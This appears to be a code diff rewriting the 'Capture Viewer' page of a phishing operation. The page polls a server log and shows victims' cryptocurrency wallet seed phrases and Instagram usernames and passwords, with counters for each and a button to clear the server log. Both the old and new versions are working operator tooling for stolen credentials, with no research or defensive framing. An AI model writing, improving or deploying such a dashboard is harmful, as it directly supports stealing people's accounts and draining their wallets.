@@ -1,381 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Capture Viewer — All Data</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: #0d0e1a;
-    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    padding: 20px;
-  }
-  .container {
-    background: #1c1d32;
-    border-radius: 20px;
-    padding: 40px;
-    width: 700px;
-    max-width: 100%;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-  }
-  h1 { color: #fff; font-size: 22px; margin-bottom: 4px; }
-  .subtitle { color: #7b7d9a; font-size: 14px; margin-bottom: 24px; }
-
-  .status {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    padding: 8px 16px;
-    border-radius: 20px;
-    font-size: 13px;
-    font-weight: 500;
-    margin-bottom: 20px;
-  }
-  .status.waiting { background: rgba(255,193,7,0.12); color: #ffc107; }
-  .status.captured { background: rgba(76,217,100,0.12); color: #4cd964; }
-  .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-  .dot.waiting { background: #ffc107; animation: pulse 1.5s ease-in-out infinite; }
-  .dot.captured { background: #4cd964; }
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
-
-  .tabs {
-    display: flex;
-    gap: 8px;
-    margin-bottom: 20px;
-  }
-  .tab {
-    padding: 8px 16px;
-    border-radius: 8px;
-    background: #262841;
-    color: #7b7d9a;
-    font-size: 13px;
-    font-weight: 500;
-    cursor: pointer;
-    border: none;
-    transition: all 0.2s;
-  }
-  .tab.active {
-    background: #3772ff;
-    color: #fff;
-  }
-  .tab:hover:not(.active) { color: #b0b2d3; }
-
-  .latest-box {
-    background: #0d0e1a;
-    border: 1px solid #3772ff;
-    border-radius: 12px;
-    padding: 20px;
-    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
-    font-size: 15px;
-    color: #e0e0e0;
-    line-height: 1.7;
-    word-break: break-all;
-    min-height: 80px;
-    user-select: all;
-    margin-bottom: 24px;
-  }
-  .latest-box .empty { color: #5a5c7e; font-style: italic; }
-
-  .cred-display {
-    display: grid;
-    grid-template-columns: auto 1fr;
-    gap: 8px 16px;
-    align-items: center;
-  }
-  .cred-label {
-    color: #7b7d9a;
-    font-size: 12px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-  .cred-value {
-    color: #e0e0e0;
-    background: #15162a;
-    padding: 8px 12px;
-    border-radius: 6px;
-    font-family: 'SFMono-Regular', Consolas, monospace;
-    font-size: 14px;
-    user-select: all;
-  }
-  .cred-value.highlight {
-    color: #ff6b6b;
-    font-weight: 600;
-  }
-
-  .raw-toggle {
-    color: #5a5c7e;
-    font-size: 12px;
-    cursor: pointer;
-    margin-bottom: 8px;
-    display: inline-block;
-  }
-  .raw-toggle:hover { color: #b0b2d3; }
-
-  .history-section h3 { color: #7b7d9a; font-size: 14px; font-weight: 500; margin-bottom: 12px; }
-  .history-entry {
-    display: flex;
-    gap: 12px;
-    padding: 10px 14px;
-    border-radius: 8px;
-    background: #15162a;
-    margin-bottom: 6px;
-    align-items: flex-start;
-    cursor: pointer;
-    transition: background 0.15s;
-  }
-  .history-entry:hover { background: #1a1b30; }
-  .history-entry.selected { border-left: 3px solid #3772ff; }
-  .entry-time { color: #5a5c7e; font-size: 11px; white-space: nowrap; min-width: 130px; padding-top: 3px; }
-  .entry-summary { color: #b0b2d3; font-size: 13px; word-break: break-all; flex: 1; }
-  .entry-type {
-    font-size: 10px;
-    font-weight: 600;
-    text-transform: uppercase;
-    padding: 2px 8px;
-    border-radius: 10px;
-    white-space: nowrap;
-  }
-  .type-phrase { background: rgba(55,114,255,0.15); color: #3772ff; }
-  .type-instagram { background: rgba(255,107,107,0.15); color: #ff6b6b; }
-  .type-unknown { background: rgba(123,92,221,0.15); color: #7b5cdd; }
-
-  .btn-group { display: flex; gap: 8px; margin-top: 16px; }
-  .btn {
-    padding: 10px 20px; border: none; border-radius: 8px;
-    font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s;
-  }
-  .btn-refresh { background: #3772ff; color: #fff; }
-  .btn-refresh:hover { background: #2a5ee6; }
-  .btn-copy { background: #262841; color: #b0b2d3; border: 1px solid #2e3058; }
-  .btn-copy:hover { background: #2e3058; color: #fff; }
-  .btn-clear { background: none; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); margin-left: auto; }
-  .btn-clear:hover { background: rgba(255,107,107,0.1); }
-
-  .hidden { display: none; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Viewer — All Data</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        h1 { color: #00ff88; font-size: 1.5rem; margin-bottom: 4px; }
+        .subtitle { color: #888; font-size: 0.85rem; margin-bottom: 20px; }
+        .stats { display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; }
+        .stat-box {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px 20px;
+        }
+        .stat-box .label { font-size: 0.75rem; color: #888; text-transform: uppercase; }
+        .stat-box .value { font-size: 1.2rem; color: #00ff88; font-weight: bold; }
+        .card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        .card.wallet { border-left: 3px solid #f7931a; }
+        .card.instagram { border-left: 3px solid #e4405f; }
+        .card.unknown { border-left: 3px solid #888; }
+        .card .header {
+            display: flex; justify-content: space-between;
+            font-size: 0.75rem; color: #666; margin-bottom: 8px;
+        }
+        .card .badge {
+            display: inline-block;
+            padding: 2px 8px; border-radius: 4px;
+            font-size: 0.7rem; font-weight: bold;
+        }
+        .badge.wallet { background: #f7931a22; color: #f7931a; }
+        .badge.instagram { background: #e4405f22; color: #e4405f; }
+        .seed-phrase {
+            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            padding: 10px;
+            border-radius: 6px;
+            word-break: break-all;
+            font-size: 0.9rem;
+            border: 1px solid #2a2a2a;
+        }
+        .creds { font-size: 0.9rem; }
+        .creds div { margin: 4px 0; }
+        .creds .field { color: #888; }
+        .creds .value { color: #fff; }
+        .error-msg {
+            background: #2a1a1a;
+            border: 1px solid #5a2a2a;
+            color: #ff6b6b;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+        }
+        .loading { color: #666; text-align: center; padding: 40px; }
+        .refresh-btn {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .refresh-btn:hover { background: #00cc6a; }
+        .no-data { color: #666; text-align: center; padding: 40px; }
+        #rawData {
+            background: #0d0d0d;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #2a2a2a;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <h1>🔑 Capture Viewer</h1>
-  <p class="subtitle">Shows seed phrases AND Instagram credentials from the same server</p>
+    <h1>🔍 Capture Viewer</h1>
+    <div class="subtitle">Seed phrases AND Instagram credentials — all on one server</div>
 
-  <div class="status waiting" id="statusBadge">
-    <span class="dot waiting" id="statusDot"></span>
-    <span id="statusText">Waiting for data...</span>
-  </div>
-
-  <div class="tabs">
-    <button class="tab active" data-view="parsed">Parsed View</button>
-    <button class="tab" data-view="raw">Raw JSON</button>
-  </div>
-
-  <!-- Parsed View -->
-  <div id="view-parsed">
-    <div class="latest-box" id="latestBox">
-      <span class="empty">No data captured yet</span>
-    </div>
-  </div>
-
-  <!-- Raw View -->
-  <div id="view-raw" class="hidden">
-    <div class="latest-box" id="rawBox" style="font-size:13px;">
-      <span class="empty">No raw data</span>
-    </div>
-  </div>
-
-  <div class="btn-group">
-    <button class="btn btn-copy" id="copyBtn">📋 Copy</button>
-    <button class="btn btn-refresh" id="refreshBtn">🔄 Refresh</button>
-    <button class="btn btn-clear" id="clearBtn">🗑️ Clear Log</button>
-  </div>
-
-  <div class="history-section" style="margin-top:20px;">
-    <h3>📜 Full History</h3>
-    <div id="historyContainer">
-      <span class="no-history" style="color:#5a5c7e;font-style:italic;font-size:13px;">No entries yet</span>
-    </div>
-  </div>
-
-  <div class="meta-info" style="color:#5a5c7e;font-size:12px;text-align:center;margin-top:16px;" id="metaInfo">
-    Last checked: --
-  </div>
-</div>
-
-<script>
-  const SERVER_URL = '/api/capture';
-  const LOG_URL    = '/api/log';
-
-  let currentData = null;
-  let selectedIndex = -1;
-
-  function detectType(data) {
-    if (!data || !data.phrase) return 'unknown';
-    try {
-      const parsed = JSON.parse(data.phrase);
-      if (parsed.username !== undefined || parsed.password !== undefined) return 'instagram';
-    } catch(e) {}
-    return 'phrase';
-  }
-
-  function formatEntry(data) {
-    const type = detectType(data);
-    if (type === 'instagram') {
-      try {
-        const p = JSON.parse(data.phrase);
-        return `
-          <div class="cred-display">
-            <span class="cred-label">Username</span>
-            <span class="cred-value highlight">${escapeHtml(p.username || '(empty)')}</span>
-            <span class="cred-label">Password</span>
-            <span class="cred-value highlight">${escapeHtml(p.password || '(empty)')}</span>
-            <span class="cred-label">Time</span>
-            <span class="cred-value">${new Date(data.timestamp).toLocaleString()}</span>
-            <span class="cred-label">Source</span>
-            <span class="cred-value"><span class="entry-type type-instagram">Instagram</span></span>
-          </div>
-        `;
-      } catch(e) {
-        return `<div class="cred-value">${escapeHtml(data.phrase)}</div>`;
-      }
-    } else {
-      return `
-        <div style="margin-bottom:6px;">
-          <span class="entry-type type-phrase" style="display:inline-block;margin-bottom:8px;">Seed Phrase</span>
+    <div class="stats">
+        <div class="stat-box">
+            <div class="label">Total Captures</div>
+            <div class="value" id="totalCount">0</div>
         </div>
-        <div class="cred-value">${escapeHtml(data.phrase)}</div>
-      `;
-    }
-  }
+        <div class="stat-box">
+            <div class="label">Wallet Seed Phrases</div>
+            <div class="value" id="walletCount">0</div>
+        </div>
+        <div class="stat-box">
+            <div class="label">Instagram Credentials</div>
+            <div class="value" id="instaCount">0</div>
+        </div>
+    </div>
 
-  function escapeHtml(str) {
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
-  }
+    <button class="refresh-btn" onclick="fetchData()">🔄 Refresh</button>
 
-  function getSummary(phrase) {
-    try {
-      const p = JSON.parse(phrase);
-      if (p.username) return `${p.username} / ${p.password || '(no pw)'}`;
-    } catch(e) {}
-    const words = phrase.split(/\s+/);
-    if (words.length >= 12) return words.slice(0,4).join(' ') + '... (' + words.length + ' words)';
-    return phrase.substring(0, 60) + (phrase.length > 60 ? '...' : '');
-  }
+    <div id="status"></div>
+    <div id="rawData">No raw data</div>
+    <div id="entries"></div>
 
-  async function fetchData() {
-    try {
-      const [latestRes, logRes] = await Promise.all([
-        fetch(SERVER_URL),
-        fetch(LOG_URL)
-      ]);
-      const latest = await latestRes.json();
-      const log    = await logRes.json();
+    <script>
+        async function fetchData() {
+            const statusEl = document.getElementById('status');
+            const rawEl = document.getElementById('rawData');
+            const entriesEl = document.getElementById('entries');
 
-      currentData = latest;
+            statusEl.textContent = 'Loading...';
+            statusEl.className = 'loading';
 
-      const statusBadge = document.getElementById('statusBadge');
-      const statusDot   = document.getElementById('statusDot');
-      const statusText  = document.getElementById('statusText');
-      const latestBox   = document.getElementById('latestBox');
-      const rawBox      = document.getElementById('rawBox');
-      const historyC    = document.getElementById('historyContainer');
+            try {
+                const response = await fetch('/api/log');
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                const data = await response.json();
 
-      // Update latest
-      if (latest.phrase && latest.phrase.trim().length > 0) {
-        latestBox.innerHTML = formatEntry(latest);
-        rawBox.textContent = JSON.stringify(JSON.parse(latest.phrase), null, 2);
+                rawEl.textContent = JSON.stringify(data, null, 2);
 
-        statusBadge.className = 'status captured';
-        statusDot.className = 'dot captured';
-        statusText.textContent = '✅ Data captured!';
-      } else {
-        latestBox.innerHTML = '<span class="empty">No data captured yet</span>';
-        rawBox.innerHTML = '<span class="empty">No raw data</span>';
-        statusBadge.className = 'status waiting';
-        statusDot.className = 'dot waiting';
-        statusText.textContent = 'Waiting for data...';
-      }
+                if (!data.entries || data.entries.length === 0) {
+                    entriesEl.innerHTML = '<div class="no-data">No entries yet</div>';
+                    document.getElementById('totalCount').textContent = '0';
+                    document.getElementById('walletCount').textContent = '0';
+                    document.getElementById('instaCount').textContent = '0';
+                    statusEl.textContent = 'No data captured yet';
+                    statusEl.className = '';
+                    return;
+                }
 
-      // Update history
-      if (log.entries && log.entries.length > 0) {
-        historyC.innerHTML = log.entries.slice().reverse().map((entry, i) => {
-          const type = detectType(entry);
-          const typeClass = type === 'instagram' ? 'type-instagram' : type === 'phrase' ? 'type-phrase' : 'type-unknown';
-          const typeLabel = type === 'instagram' ? 'Instagram' : type === 'phrase' ? 'Phrase' : 'Unknown';
-          return `
-            <div class="history-entry ${i === selectedIndex ? 'selected' : ''}" data-index="${i}">
-              <span class="entry-time">${new Date(entry.timestamp).toLocaleString()}</span>
-              <span class="entry-summary">${escapeHtml(getSummary(entry.phrase))}</span>
-              <span class="entry-type ${typeClass}">${typeLabel}</span>
-            </div>
-          `;
-        }).join('');
+                const entries = data.entries;
+                document.getElementById('totalCount').textContent = entries.length;
 
-        // Click to select
-        document.querySelectorAll('.history-entry').forEach(el => {
-          el.addEventListener('click', function() {
-            document.querySelectorAll('.history-entry').forEach(e => e.classList.remove('selected'));
-            this.classList.add('selected');
-            const idx = parseInt(this.dataset.index);
-            const entry = log.entries.slice().reverse()[idx];
-            if (entry) {
-              currentData = entry;
-              document.getElementById('latestBox').innerHTML = formatEntry(entry);
-              try {
-                document.getElementById('rawBox').textContent = JSON.stringify(JSON.parse(entry.phrase), null, 2);
-              } catch(e) {
-                document.getElementById('rawBox').textContent = entry.phrase;
-              }
+                let walletCount = 0;
+                let instaCount = 0;
+                let html = '';
+
+                // Show newest first
+                const reversed = [...entries].reverse();
+
+                for (const entry of reversed) {
+                    const time = new Date(entry.timestamp).toLocaleString();
+
+                    // Detect type
+                    let type = 'unknown';
+                    let displayHtml = '';
+
+                    if (entry.username !== undefined && entry.password !== undefined) {
+                        // Instagram credentials
+                        type = 'instagram';
+                        instaCount++;
+                        displayHtml = `
+                            <div class="creds">
+                                <div><span class="field">Username:</span> <span class="value">${escapeHtml(entry.username || '')}</span></div>
+                                <div><span class="field">Password:</span> <span class="value">${escapeHtml(entry.password || '')}</span></div>
+                                ${entry.page ? `<div><span class="field">Page:</span> <span class="value">${escapeHtml(entry.page)}</span></div>` : ''}
+                            </div>
+                        `;
+                    } else if (entry.phrase) {
+                        // Wallet seed phrase
+                        type = 'wallet';
+                        walletCount++;
+                        displayHtml = `<div class="seed-phrase">${escapeHtml(entry.phrase)}</div>`;
+                    } else if (entry.username !== undefined || entry.password !== undefined) {
+                        type = 'instagram';
+                        instaCount++;
+                        displayHtml = `
+                            <div class="creds">
+                                ${entry.username !== undefined ? `<div><span class="field">Username:</span> <span class="value">${escapeHtml(entry.username)}</span></div>` : ''}
+                                ${entry.password !== undefined ? `<div><span class="field">Password:</span> <span class="value">${escapeHtml(entry.password)}</span></div>` : ''}
+                            </div>
+                        `;
+                    } else {
+                        displayHtml = `<div class="seed-phrase">${escapeHtml(JSON.stringify(entry))}</div>`;
+                    }
+
+                    html += `
+                        <div class="card ${type}">
+                            <div class="header">
+                                <span>${time}</span>
+                                <span class="badge ${type}">${type === 'wallet' ? '🔑 Wallet' : type === 'instagram' ? '📸 Instagram' : '❓ Unknown'}</span>
+                            </div>
+                            ${displayHtml}
+                        </div>
+                    `;
+                }
+
+                document.getElementById('walletCount').textContent = walletCount;
+                document.getElementById('instaCount').textContent = instaCount;
+                entriesEl.innerHTML = html;
+                statusEl.textContent = `Showing ${entries.length} entries (newest first)`;
+                statusEl.className = '';
+
+            } catch (err) {
+                statusEl.textContent = `Error: ${err.message}`;
+                statusEl.className = 'error-msg';
+                console.error('Fetch error:', err);
             }
-          });
-        });
-      } else {
-        historyC.innerHTML = '<span style="color:#5a5c7e;font-style:italic;font-size:13px;">No entries yet</span>';
-      }
+        }
 
-      document.getElementById('metaInfo').textContent = `Last checked: ${new Date().toLocaleString()}`;
-    } catch(err) {
-      document.getElementById('latestBox').innerHTML = '<span class="empty">Error connecting to server</span>';
-    }
-  }
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;');
+        }
 
-  // ── Tab switching ──
-  document.querySelectorAll('.tab').forEach(tab => {
-    tab.addEventListener('click', function() {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      this.classList.add('active');
-      const view = this.dataset.view;
-      document.getElementById('view-parsed').classList.toggle('hidden', view !== 'parsed');
-      document.getElementById('view-raw').classList.toggle('hidden', view !== 'raw');
-    });
-  });
-
-  document.getElementById('copyBtn').addEventListener('click', () => {
-    const text = document.getElementById('latestBox').textContent;
-    if (!text || text.includes('No data')) return;
-    navigator.clipboard.writeText(text).then(() => {
-      document.getElementById('copyBtn').textContent = '✅ Copied!';
-      setTimeout(() => document.getElementById('copyBtn').textContent = '📋 Copy', 2000);
-    });
-  });
-
-  document.getElementById('refreshBtn').addEventListener('click', fetchData);
-
-  document.getElementById('clearBtn').addEventListener('click', async () => {
-    if (confirm('Clear the log file on the server?')) {
-      await fetch('/api/clear-log', { method: 'POST' });
-      fetchData();
-    }
-  });
-
-  setInterval(fetchData, 3000);
-  fetchData();
-</script>
+        // Auto-refresh on load
+        fetchData();
+        // Auto-refresh every 5 seconds
+        setInterval(fetchData, 5000);
+    </script>
 </body>
 </html>
